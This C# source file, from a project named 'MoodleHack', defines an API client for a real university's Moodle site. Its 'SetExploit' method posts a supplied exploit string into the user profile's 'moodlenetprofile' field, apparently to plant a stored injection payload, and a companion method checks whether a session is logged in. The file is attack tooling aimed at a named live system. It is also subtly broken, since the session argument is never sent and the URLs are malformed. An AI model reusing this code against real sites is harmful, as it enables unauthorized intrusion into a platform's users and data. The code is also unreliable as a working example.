using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;

namespace MoodleHack.API.Services
{
    public class SdoApiClient : IDisposable
    {
        public const string BaseEndpoint = "https://online-edu.mirea.ru/";
        private readonly HttpClient _httpClient;

        public SdoApiClient()
        {
            _httpClient = new HttpClient();
        }

        public async Task<bool> Validate(string moodleSession)
        {
            var url = BaseEndpoint + "/user/edit.php";
            var request = new HttpRequestMessage
            {
                Method = HttpMethod.Get,
                RequestUri = new Uri(url)
            };
            var response = await _httpClient.SendAsync(request);
            var responseString = await response.Content.ReadAsStringAsync();
            return !responseString.Contains("Для продолжения необходима авторизация") && response.IsSuccessStatusCode;
        }
        public async Task<bool> SetExploit(string moodleSession, string exploit)
        {
            var url = BaseEndpoint + "/user/edit.php";
            var dict = new Dictionary<string, string>()
            {
                ["moodlenetprofile"]= exploit
            };
            var content = new FormUrlEncodedContent(dict);
            var request = new HttpRequestMessage
            {
                Method = HttpMethod.Post,
                RequestUri = new Uri(url),
                Content = content
            };
            var response = await _httpClient.SendAsync(request);
            return response.IsSuccessStatusCode;
        }

        public void Dispose()
        {
            _httpClient?.Dispose();
        }
    }
}